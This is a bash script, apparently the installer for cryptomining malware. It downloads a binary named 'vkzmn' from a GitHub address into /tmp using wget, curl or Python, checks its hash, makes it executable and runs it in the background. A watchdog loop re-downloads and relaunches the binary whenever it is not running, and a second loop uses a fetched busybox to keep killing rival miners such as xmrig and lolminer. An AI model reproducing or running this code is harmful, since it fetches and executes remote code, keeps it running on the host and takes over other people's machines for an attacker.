#!//bin/bash


url='https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn'
killall='https://busybox.net/downloads/binaries/1.16.1/busybox-x86_64'





execute_vkzmn() {

chmod_ok=0
chmod 777 /tmp/vkzmn
if (( $? )) ; then
echo  erro  em aplica  a permissao no vkzmn
exit
else 
chmod_ok=1
fi ; 
if  (( $chmod_ok ))  ; then
nohup  /tmp/vkzmn  &
fi ;

}



check_wget() {

command -v wget 

if (( $? )) ; then #if last err not  0  wget not found

check_curl

else

echo  wget encontrado


wget $killall  -O /tmp/busybox  #download of busybox  to use killall to kill  miners process

chmod 777 /tmp/busybox


wget $url -O /tmp/vkzmn




fi;

}




check_curl() {



command -v  curl

if (( $? )) ; then 

echo curl not found 

check_python

else 

echo usando curl

curl -L  $url -o /tmp/vkzmn

check_file


fi;

}


check_python(){


command -v  python3

if (( $? )) ; then

echo python nao instalado


else 

echo  usando python

python3 -c 'import requests ; a=requests.get( "https://github.com/atilabyte/bash/raw/refs/heads/master/vkzmn");ptr=open("/tmp/vkzmn","wb");ptr.write(a.content) '


check_file

fi ; 


}




check_file() {

vkzmn_in_tmp=0
ls /tmp/vkzmn  
if (( $? )) ; then
echo vkzmn nao esta em //tmp
check_wget
else 
vkzmn_in_tmp=1
fi ;
if (( $vkzmn_in_tmp )) ; then 
echo vkzmn ja esta em //tmp
magic 
fi;

}





magic() {  #check  if file is elf
hash=0
echo checando  a integridade do arquivo
command -v  md5sum
 if (( $?  )) ; then
echo md5sum nao encontrado
exit #use  od 
fi;
md5=$( md5sum /tmp/vkzmn )
for  m  in $md5 ; do  
if [[ $m = '002ab35974600f09c26abe5b15ad11f4' ]] ; then
hash=1
fi;
done
if (( $hash )) ; then
echo binario conhecido
execute_vkzmn
fi ;
if  [  $hash  -eq   0  ]   ; then 
echo binario  desconecido
check_wget
fi ; 
}
# -------------------------------------------


proc() {
true=1000
while true ; do
vkzmn_ok=0
dir_proc=$( ls  /proc )
for  pid  in   $dir_proc ; do
if  ((  $pid  >  0  )) ; then #get only numbers
comm=$( cat  /proc/$pid/comm )
for  cc in  $comm ; do
if [ $cc  =  "vkzmn" ] ; then
vkzmn_ok=$true
fi ; 
done
fi; 
done
if   [  $vkzmn_ok   -eq    $true   ]  ; then
echo vkzmn_ok
else 
echo  vkzmn_not_ok
check_file   
fi ; 
done
} 

###############################
pg() {

vkzmn_ok=1
pgrep=0
command -v pgrep  
if (( $? )) ; then #if last err not 0 pgrep not instaled
echo pgrep not instaled
proc
else 
pgrep=1
fi ; 
if [ $pgrep -eq 1 ]  ; then
pgrep  vkzmn 
if (( $? )) ; then

vkzmn_ok=0

else 

vkzmn_ok=1

fi;


if [  $vkzmn_ok   -eq  0  ]  ; then

echo vkzmn nao  esta em execucao

check_file

fi;


fi; 

}


init() {

while  true ; do

sleep  1

pg

done
}



my_killall(){


while true ; do



/tmp/./busybox  killall  xmrig xmrig1 xmrig2 lolminer bzminer SRBMiner-MULTI nokillme

sleep  5

done

}


my_killall &

 
init 












